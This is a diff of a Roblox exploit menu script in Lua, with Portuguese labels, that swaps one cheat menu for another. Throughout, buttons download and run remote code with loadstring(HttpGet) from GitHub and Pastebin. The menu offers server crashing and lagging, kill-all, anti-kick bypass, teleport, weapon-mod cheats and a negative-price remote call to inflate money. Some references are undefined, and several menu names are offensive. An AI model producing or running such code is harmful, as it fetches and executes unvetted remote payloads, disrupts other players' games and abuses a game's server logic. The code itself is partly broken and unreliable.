@@ -1,46 +1,579 @@
-local UILib = loadstring(game:HttpGet('https://raw.githubusercontent.com/StepBroFurious/Script/main/HydraHubUi.lua'))()
-local Window = UILib.new("Lucas Menu", game.Players.LocalPlayer.UserId, "LucasMenu")
-local Category1 = Window:Category("Main", "http://www.roblox.com/asset/?id=8395621517")
-local Category2 = Window:Category("EM BREVE", "http://www.roblox.com/asset/?id=8395621517")
-local SubButton1 = Category2:Button("RM BREVE", "http://www.roblox.com/asset/?id=8395747586")
-local SubButton1 = Category1:Button("PVP", "http://www.roblox.com/asset/?id=8395747586")
-local Section1 = SubButton1:Section("Section", "Left")
-Section1:Button({
-    Title = "INFINITY YIELD",
-    ButtonName = "EXECUTAR",
-    Description = "LucasMenu",
-    }, function(value)
-    print(loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))())
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+OrionLib:MakeNotification({
+    Name = "Zrey Menu (free)",
+    Content = "Executando.....",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+
+local Window = OrionLib:MakeWindow({Name = "Zrey Menu V1", HidePremium = false, SaveConfig = true, ConfigFolder = "Zrey"})
+
+
+local PlayerTab = Window:MakeTab({
+    Name = "Player",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local PlayerSection = PlayerTab:AddSection({
+    Name = "Funçoes"
+})
+
+PlayerSection:AddButton({
+    Name = "Crash server",
+    Callback = function(value)
+    print(loadstring(game:HttpGet("https://pastebin.com/raw/HGBJqVMu",true))())
+      end
+})
+
+PlayersTab:AddButton({
+    Name = "Kill all - Regime militar de 83",
+    Callback = function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/Pedroxz63/killall/main/README.md'),true))()
+      end   
+})
+
+JogadorTab:AddButton({
+	Name = "Reviver (!)",
+	Callback = function()
+        game:GetService("ReplicatedStorage").Remotes.Menu:FireServer()
+        wait(000000.5)
+  	end    
+})
+
+PlayersTab:AddButton({
+	Name = "Bypass Stopper Anti kick V9",
+	Callback = function()
+        wait(0.5)local ba=Instance.new("ScreenGui")
+        local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
+        local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
+        ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
+        ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
+        ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,370,0,52)
+        ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti Kick V9"ca.TextColor3=Color3.new(0,1,1)
+        ca.TextSize=22;da.Parent=ca
+        da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
+        da.Size=UDim2.new(0,370,0,107)_b.Parent=da
+        _b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
+        _b.Size=UDim2.new(0,370,0,21)_b.Font=Enum.Font.Arial;_b.Text="Feito Zrey menu "
+        _b.TextColor3=Color3.new(0,1,1)_b.TextSize=20;ab.Parent=da
+        ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377,0)
+        ab.Size=UDim2.new(0,370,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Active"
+        ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
+        game:service'Players'.LocalPlayer.Idled:connect(function()
+        bb:CaptureController()bb:ClickButton2(Vector2.new())
+        ab.Text="Roblox tried to kick u but i kicked him instead"wait(2)ab.Text="Status : Active"end)
+  	end    
+})
+
+PlayerSection:AddButton({
+    Name = "Lag server",
+    Callback = function(value)
+    print(loadstring(game:HttpGet("https://pastebin.com/raw/HGBJqVMu",true))())
+      end
+})
+
+local JogadorTab = Window:MakeTab({
+	Name = "Armas",
+	Icon = "",
+	PremiumOnly = false
+})
+local Section = JogadorTab:AddSection({
+	Name = "Hub"
+})
+
+JogadorTab:AddButton({
+	Name = "Ver Inventario Da Pessoa",
+	Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/pedroxzytbhypee/inventariobydrec/main/README.md'))()
+  	end  
+})
+
+JogadorTab:AddButton({
+	Name = "Auto Pos",
+	Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/G-development-M/DreckModz/main/By_dreck_/AutoPos.lua'))()
+  	end   
+})
+JogadorTab:AddButton({
+    Name = "Staff Online",
+    Callback = function()
+    local StaffOnline = Instance.new("ScreenGui")
+    local Frame = Instance.new("Frame")
+    local UICorner = Instance.new("UICorner")
+    local Frame_2 = Instance.new("Frame")
+    local UICorner_2 = Instance.new("UICorner")
+    local TextLabel = Instance.new("TextLabel")
+    local TextLabel_2 = Instance.new("TextLabel")
+    local TextLabel_3 = Instance.new("TextLabel")
+    local TextLabel_4 = Instance.new("TextLabel")
+    local TextLabel_5 = Instance.new("TextLabel")
+    local TextButton = Instance.new("TextButton")
+    local Frame_3 = Instance.new("Frame")
+    local Frame_4 = Instance.new("Frame")
+    
+    --Config e fundo etc
+    
+    StaffOnline.Name = "Staff Online"
+    StaffOnline.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    StaffOnline.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    Frame.Parent = StaffOnline
+    Frame.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
+    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    Frame.BorderSizePixel = 0
+    Frame.Position = UDim2.new(0.691468894, 0, 0.270807445, 0)
+    Frame.Size = UDim2.new(0, 350, 0, 369)
+    Frame.Draggable = true
+    Frame.Active = true
+    Frame.Selectable = true
+    
+    UICorner.Parent = Frame
+    
+    Frame_2.Parent = Frame
+    Frame_2.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+    Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    Frame_2.BorderSizePixel = 0
+    Frame_2.Position = UDim2.new(0.0271547157, 0, 0.0290527344, 0)
+    Frame_2.Size = UDim2.new(0, 340, 0, 358)
+    
+    UICorner_2.Parent = Frame_2
+    
+    TextLabel.Parent = Frame_2
+    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.BackgroundTransparency = 1.000
+    TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    TextLabel.BorderSizePixel = 0
+    TextLabel.Position = UDim2.new(0.191176474, 0, 0, 0)
+    TextLabel.Size = UDim2.new(0, 200, 0, 50)
+    TextLabel.Font = Enum.Font.SourceSansBold
+    TextLabel.Text = "Staffs OnLine"
+    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.TextScaled = true
+    TextLabel.TextSize = 14.000
+    TextLabel.TextWrapped = true
+    
+    TextLabel_2.Parent = TextLabel
+    TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel_2.BackgroundTransparency = 1.000
+    TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    TextLabel_2.BorderSizePixel = 0
+    TextLabel_2.Position = UDim2.new(0.136176765, 0, 0.800000012, 0)
+    TextLabel_2.Size = UDim2.new(0, 126, 0, 36)
+    TextLabel_2.Font = Enum.Font.SourceSansItalic
+    TextLabel_2.Text = "(7)"
+    TextLabel_2.TextColor3 = Color3.fromRGB(0, 255, 8)
+    TextLabel_2.TextScaled = true
+    TextLabel_2.TextSize = 14.000
+    TextLabel_2.TextWrapped = true
+    
+    TextLabel_3.Parent = TextLabel_2
+    TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel_3.BackgroundTransparency = 1.000
+    TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    TextLabel_3.BorderSizePixel = 0
+    TextLabel_3.Position = UDim2.new(-0.00667995866, 0, 1.49444413, 0)
+    TextLabel_3.Size = UDim2.new(0, 126, 0, 36)
+    TextLabel_3.Font = Enum.Font.SourceSansItalic
+    TextLabel_3.Text = "Player 1"
+    TextLabel_3.TextColor3 = Color3.fromRGB(255, 0, 4)
+    TextLabel_3.TextScaled = true
+    TextLabel_3.TextSize = 14.000
+    TextLabel_3.TextWrapped = true
+    
+    TextLabel_4.Parent = TextLabel_3
+    TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel_4.BackgroundTransparency = 1.000
+    TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    TextLabel_4.BorderSizePixel = 0
+    TextLabel_4.Position = UDim2.new(-0.00667995866, 0, 1.49444413, 0)
+    TextLabel_4.Size = UDim2.new(0, 126, 0, 36)
+    TextLabel_4.Font = Enum.Font.SourceSansItalic
+    TextLabel_4.Text = "Player 2"
+    TextLabel_4.TextColor3 = Color3.fromRGB(255, 0, 4)
+    TextLabel_4.TextScaled = true
+    TextLabel_4.TextSize = 14.000
+    TextLabel_4.TextWrapped = true
+    
+    TextLabel_5.Parent = TextLabel_4
+    TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel_5.BackgroundTransparency = 1.000
+    TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    TextLabel_5.BorderSizePixel = 0
+    TextLabel_5.Position = UDim2.new(-0.536126971, 0, 1.63888884, 0)
+    TextLabel_5.Size = UDim2.new(0, 283, 0, 134)
+    TextLabel_5.Font = Enum.Font.Unknown
+    TextLabel_5.Text = "Encontramos Um Erro Na Busca De Procurar Staffs Online (Erro SCRIPT Adonis Detect) Protetor Anti Ban"
+    TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel_5.TextScaled = true
+    TextLabel_5.TextSize = 14.000
+    TextLabel_5.TextWrapped = true
+    
+    TextButton.Parent = Frame_2
+    TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextButton.BackgroundTransparency = 1.000
+    TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    TextButton.BorderSizePixel = 0
+    TextButton.Position = UDim2.new(0.688235283, 0, -0.00201245537, 0)
+    TextButton.Size = UDim2.new(0, 149, 0, 38)
+    TextButton.Font = Enum.Font.SourceSansBold
+    TextButton.Text = "X"
+    TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
+    TextButton.TextScaled = true
+    TextButton.TextSize = 14.000
+    TextButton.TextStrokeColor3 = Color3.fromRGB(255, 11, 44)
+    TextButton.TextWrapped = true
+    TextButton.MouseButton1Down:Connect(function()
+        Frame:Destroy()
+    end)
+    
+    Frame_3.Parent = Frame_2
+    Frame_3.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
+    Frame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    Frame_3.BorderSizePixel = 0
+    Frame_3.Position = UDim2.new(0.0235294122, 0, 0.0195530728, 0)
+    Frame_3.Size = UDim2.new(0, 7, 0, 337)
+    
+    Frame_4.Parent = Frame_3
+    Frame_4.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
+    Frame_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    Frame_4.BorderSizePixel = 0
+    Frame_4.Position = UDim2.new(45.3092384, 0, -0.00715315714, 0)
+    Frame_4.Size = UDim2.new(0, 7, 0, 337)
+  end 
+
+})
+JogadorTab:AddButton({
+    Name = "Teleport Player",
+    Callback = function()
+        ----------------------
+-- SHARK X HUB NO 1 --
+----------------------
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Zrey Teleport", "DarkTheme")
+local Tab = Window:NewTab("Players")
+local Section = Tab:NewSection("Teleport")
+
+--------------------
+
+players = {}
+
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+table.insert(players,v.Name)
+end
+
+Section:NewDropdown("Select Player", " ", players, function(abc)
+Select = abc
 end)
 
-Section1:Toggle({
-    Title = "GOD MODE",
-    Description = "LucasMenu",
-    Default = false
-    }, function(value)
-    print(loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main",true))())
+
+Section:NewButton("Refresh", " ", function()
+table.clear(players)
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+table.insert(players,v.Name)
+end
 end)
 
-Section1:Keybind({
-    Title = "Aimbot",
-    Description = "LucasMenu",
-    Default = Enum.KeyCode.Q,
-    }, function(value)
-    print(loadstring(game:HttpGet("https://raw.githubusercontent.com/webcriamanca/LucasMenu-aimbot-/main/LucasMenu%20(aimbot)",true))())
+Section:NewButton("Teleport", " ", function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame
 end)
+      end   
+}) 
 
-Section1:Button({
-    Title = "ESP V2",
-    ButtonName = "EXECUTAR",
-    Description = "LucasMenu",
-    }, function(value)
-    print(loadstring(game:HttpGet("https://raw.githubusercontent.com/webcriamanca/ESP-LucasMenu-/main/esp%20lucasmenu",true))())
-end)
+JogadorTab:AddButton({
+	Name = "Give armas - ACS",
+	Callback = function()
+        xpcall(function()
+            local Player = game.Players.LocalPlayer
+            local Storage = game.ReplicatedStorage
+            local Teams = game:GetService("Teams")
+            local Undo,Guns,MCache = {},{},{}
+            
+            function ChildrenOfTool(gc)
+                local total = 0
+                for i,v in next, gc do
+                    if v:IsA("Tool") then
+                        total = total + 1
+                    end
+                end
+                
+                return total
+            end
+            
+            -- GUI
+            local _raw
+            local _liblink = "https://raw.githubusercontent.com/loglizzy/Elerium-lib/main/lib.min.lua"
+            if isfile and readfile then
+                if isfile("log-Elerium.lib") then
+                    _raw = readfile("log-Elerium.lib")
+                else
+                    _raw = game:HttpGet(_liblink)
+                    writefile("log-Elerium.lib", _raw)
+                end
+            else
+                _raw = game:HttpGet(_liblink)
+            end
+            
+            local Library = loadstring(_raw)()
+            local Window,WRender = Library:AddWindow("Racismo 2.0.1 [BETA]", {
+                main_color = Color3.fromRGB(45, 45, 45),
+                min_size = Vector2.new(350, 600),
+                toggle_key = Enum.KeyCode.RightShift,
+                can_resize = true,
+            })
+            
+            WRender.ImageColor3 = Color3.fromRGB(55,55,55)
+            
+            -- UI funcs
+            function switch(self, data, state)
+                local gun,old = self.gun,self.old
+                for i,v in next, data do
+                    Guns[gun][i] = state and v or old[i]
+                end
+            end
+            
+            function FoldInto(tab,t,cl)
+                local gc = t:GetChildren()
+                local folder,render
+                
+                local len = ChildrenOfTool(gc)
+                if len > 0 then
+                    folder,render = tab:AddFolder(
+                        ' <b><font color="rgb(180,180,180)">'..len..'</font></b>  '
+                        ..t.Name
+                    )
+                    
+                    render.Button.RichText = true
+                    if t:IsA("Team") or cl then
+                        render.ImageColor3 = cl or t.TeamColor.Color
+                        render.ImageTransparency = 0.6
+                        render.Button.TextButton_Roundify_4px.Visible = false
+                    end
+                    
+                    for i,v in next, gc do
+                        if not v:IsA("Tool") then continue end
+                        
+                        if v:FindFirstChild("ACS_Settings") then
+                            Guns[v] = require(v.ACS_Settings)
+                            local old = {}
+                            for i,v in next, Guns[v] do
+                                old[i] = v
+                            end
+                            
+                            MCache[v] = {gun=v, old=old, switch=switch}
+                        end
+                        
+                        folder:AddSwitch(v.Name, function(s)
+                            Undo[v] = s and t
+                            v.Parent = s and Player.Backpack or t
+                        end)
+                    end
+                end
+                
+                return folder,render
+            end
+            
+            -- Tools Tab
+            local Tools = Window:AddTab("Times")
+            for i,t in next, Teams:GetChildren() do
+                FoldInto(Tools, t)
+            end
+            
+            Tools:Show()
+            
+            -- Geral
+            local Geral = Window:AddTab("Geral")
+            
+            FoldInto(Geral, Storage)
+            function _foldloop(v)
+                for i,t in next, v:GetChildren() do
+                    FoldInto(Geral, t)
+                    if t:IsA("Folder") then
+                        _foldloop(t)
+                    end
+                end
+            end
+            
+            _foldloop(Storage)
+            
+            -- ACS mods
+            local Mods = Window:AddTab("Mods")
+            
+            local ACS = Mods:AddFolder("ACS")
+            ACS:AddSwitch("MuniÃ§Ã£o Infinita", function(state)
+                for i,v in next, MCache do
+                    v:switch({
+                        Ammo = math.huge,
+                        StoredAmmo = math.huge,
+                        AmmoInGun = math.huge
+                    }, state)
+                end
+            end)
+            
+            ACS:AddSwitch("Sem recuo", function(state)
+                for i,v in next, MCache do
+                    v:switch({
+                        MaxRecoilPower = 0,
+                        camRecoil = {
+                            camRecoilRight={0,0},camRecoilUp={0,0},
+                            camRecoilLeft={0,0},camRecoilTilt={0,0}
+                        }
+                    }, state)
+                end
+            end)
+            
+            ACS:AddSwitch("Sem dispersÃ£o de balas", function(state)
+                for i,v in next, MCache do
+                    v:switch({
+                        MaxSpread = 0
+                    }, state)
+                end
+            end)
+            
+            ACS:AddSwitch("Sem emperragem", function(state)
+                for i,v in next, MCache do
+                    v:switch({
+                        CanBreak = false
+                    }, state)
+                end
+            end)
+            
+            ACS:AddSwitch("Sem gravidade em balas", function(state)
+                for i,v in next, MCache do
+                    v:switch({
+                        CanBreak = false
+                    }, state)
+                end
+            end)
+            
+            ACS:AddSlider("Tiros em rajada", function(num)
+                for i,v in next, MCache do
+                    Guns[v.gun].BurstShot = num
+                end
+            end,{min = 2, max = 10})
+            
+            local Modes = ACS:AddFolder("Modos de tiro")
+            local _modes = {ChangeFiremode = true, Auto=false, Burst=false, Semi=true}
+            
+            Modes:AddSwitch("Automatico", function(state)
+                _modes["Auto"] = state
+                for i,v in next, MCache do
+                    v:switch({
+                        FireModes = _modes
+                    }, state)
+                end
+            end)
+            
+            Modes:AddSwitch("Rajada", function(state)
+                _modes["Burst"] = state
+                for i,v in next, MCache do
+                    v:switch({
+                        FireModes = _modes
+                    }, state)
+                end
+            end)
+            
+            Modes:AddSwitch("Semi", function(state)
+                _modes["Semi"] = state
+                for i,v in next, MCache do
+                    v:switch({
+                        FireModes = _modes
+                    }, state)
+                end
+            end)
+            
+            -- NoCol mods
+            local NOC = Mods:AddFolder("NoCol")
+            
+            -- Backpack Undo
+            function OnChar(char)
+                char:WaitForChild("Humanoid").Died:wait()
+                for i,v in next, Undo do
+                    if v then i.Parent = Player.Backpack end
+                end
+                
+                Player.CharacterAdded:wait()
+                for i,v in next, Undo do
+                    if v then i.Parent = Player.Backpack end
+                end
+            end
+            
+            Player.CharacterAdded:connect(OnChar)
+            OnChar(Player.Character or Player.CharacterAdded:wait())
+            end,print)
+  	end    
+})
 
-Section1:Button({
-    Title = "FLY GUI V3",
-    ButtonName = "EXECUTAR",
-    Description = "LucasMenu",
-    }, function(value)
-    print(loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))())
-end)
+local MoneyTab = Window:MakeTab({
+    Name = "Money",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local MoneyTab = Window:MakeTab({
+    Name = "MONEY - LEABOARD",
+    Icon = "",
+    PremiumOnly = false
+})
+local Section = MoneyTab:AddSection({
+    Name = "Hub"
+})
+MoneyTab:AddButton({
+    Name = "Altera leaboard",
+    Callback = function()
+        loadstring(game:HttpGet(('https://pst.klgrth.io/paste/9dfhy/raw'),true))()
+      end
+})
+local Section = MoneyTab:AddSection({
+    Name = "BNL"
+})
+MoneyTab:AddButton({
+    Name = "Set Money",
+    Callback = function()
+        local args = {
+            [1] = {
+                [1] = "",
+                [2] = "",
+                [3] = "",
+                [4] = 0,
+                [5] = 19,
+                [6] = -293400000
+            }
+        }
+
+        game:GetService("ReplicatedStorage").EventosRemote.ComprarCarro:FireServer(unpack(args))
+      end
+})
+
+MoneyTab:AddButton({
+	Name = "Puxar Dinheiro (300K)",
+	Callback = function()
+      		local Player = game.Players.LocalPlayer
+local Dinheiro = Player.leaderstats.Dinheiro
+
+Dinheiro.Value = 300000
+  	end   
+    })
+
+MoneyTab:AddButton({
+	Name = "Puxar Dinheiro Vida No Para",
+	Callback = function()
+      		local Player = game.Players.LocalPlayer
+local Dinheiro = Player.leaderstats.Dinheiro
+
+Dinheiro.Value = 99999999
+  	end    
+})
+
+MoneyTab:AddButton({
+	Name = "Puxar Dinheiro TGI",
+	Callback = function()
+      		local Player = game.Players.LocalPlayer
+local Dinheiro = Player.leaderstats.Dinheiro
+
+Dinheiro.Value = 99999999
+  	end    
+})
